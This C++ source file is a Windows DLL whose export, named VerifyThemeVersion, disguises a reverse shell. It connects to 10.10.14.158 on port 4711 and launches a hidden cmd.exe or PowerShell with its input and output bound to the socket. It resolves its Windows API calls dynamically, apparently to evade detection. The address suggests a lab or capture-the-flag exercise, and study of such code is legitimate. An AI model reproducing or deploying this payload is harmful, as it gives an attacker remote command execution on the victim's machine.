#include "main.hpp"

#ifdef _DEBUG
#include <iostream>
#endif // _DEBUG

int VerifyThemeVersion(void)
{
#ifdef _DEBUG
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    std::cout.clear();
    std::clog.clear();
    std::cerr.clear();
    std::cin.clear();

    std::cout << ">> VerifyThemeVersion()" << std::endl;
#endif // _DEBUG

    X();
#ifdef _DEBUG
    std::cin.get();
#endif // _DEBUG
    return 0;
}

void X() noexcept
{
    constexpr auto rHost = "10.10.14.158";
    constexpr auto rPort = "4711";
    constexpr auto autoReconnect = false;

    const char* rBinaries[]{
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "powershell.exe",
        "cmd.exe"
    };

    RTFN::RtFnLoadLibraryA("kernel32.dll");
    RTFN::RtFnLoadLibraryA("ws2_32.dll");

    char filename[MAX_PATH]{ 0 };

    for (auto& bin : rBinaries)
    {
        if (RTFN_GET_ADDR("kernel32.dll", GetFileAttributesA)(bin) != INVALID_FILE_ATTRIBUTES 
            && RTFN_GET_ADDR("kernel32.dll", GetLastError)() != ERROR_FILE_NOT_FOUND)
        {
            strcpy_s(filename, bin);
            break;
        }
        else if (RTFN_GET_ADDR("kernel32.dll", SearchPathA)(nullptr, bin, nullptr, MAX_PATH, filename, nullptr))
        {
            break;
        }
    }

#ifdef _DEBUG
    std::cout << ">> Selected binary: " << filename << std::endl;
#endif // _DEBUG

    if (strlen(filename))
    {
        WSAData wsaData{ 0 };
        auto wsaError = RTFN_GET_ADDR("ws2_32.dll", WSAStartup)(MAKEWORD(2, 2), &wsaData);

        if (!wsaError)
        {
            addrinfo hints { 0 };
            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;

            addrinfo* addrInfo = nullptr;
            auto addrinfoError = RTFN_GET_ADDR("ws2_32.dll", getaddrinfo)(rHost, rPort, &hints, &addrInfo);
#ifdef _DEBUG
            std::cout << ">> addrinfoError: " << addrinfoError << std::endl;
#endif // _DEBUG

            do
            {
#ifdef _DEBUG
                std::cout << ">> Connecting..." << std::endl;
#endif // _DEBUG

                auto sock = RTFN_GET_ADDR("ws2_32.dll", WSASocketW)(addrInfo->ai_family, addrInfo->ai_socktype, addrInfo->ai_protocol, 0, 0, 0);
                auto connectError = RTFN_GET_ADDR("ws2_32.dll", WSAConnect)(sock, addrInfo->ai_addr, static_cast<int>(addrInfo->ai_addrlen), 0, 0, 0, 0);

#ifdef _DEBUG
                std::cout << ">> connectError: " << connectError << std::endl;

#endif // _DEBUG

                if (connectError)
                {
                    RTFN_GET_ADDR("ws2_32.dll", closesocket)(sock);
                    continue;
                }

                STARTUPINFOA si{ 0 };
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                si.hStdInput = reinterpret_cast<HANDLE>(sock);
                si.hStdOutput = reinterpret_cast<HANDLE>(sock);
                si.hStdError = reinterpret_cast<HANDLE>(sock);

#ifdef _DEBUG
                std::cout << ">> CreateProcessA: " << filename << std::endl;
#endif // _DEBUG

                PROCESS_INFORMATION pi{ 0 };
                RTFN_GET_ADDR("kernel32.dll", CreateProcessA)(0, filename, 0, 0, 1, 0, 0, 0, &si, &pi);
                RTFN_GET_ADDR("kernel32.dll", WaitForSingleObject)(pi.hProcess, INFINITE);
                RTFN_GET_ADDR("kernel32.dll", CloseHandle)(pi.hProcess);
                RTFN_GET_ADDR("kernel32.dll", CloseHandle)(pi.hThread);
                RTFN_GET_ADDR("ws2_32.dll", closesocket)(sock);
            } while (autoReconnect);

            RTFN_GET_ADDR("ws2_32.dll", freeaddrinfo)(addrInfo);
            RTFN_GET_ADDR("ws2_32.dll", WSACleanup)();
        }
#ifdef _DEBUG
        else
        {
            std::cout << ">> WSAStartup failed with code: " << wsaError << std::endl;
        }
#endif // _DEBUG
    }
#ifdef _DEBUG
    else
    {
        std::cout << ">> No valid binary found" << std::endl;
    }
#endif // _DEBUG
}
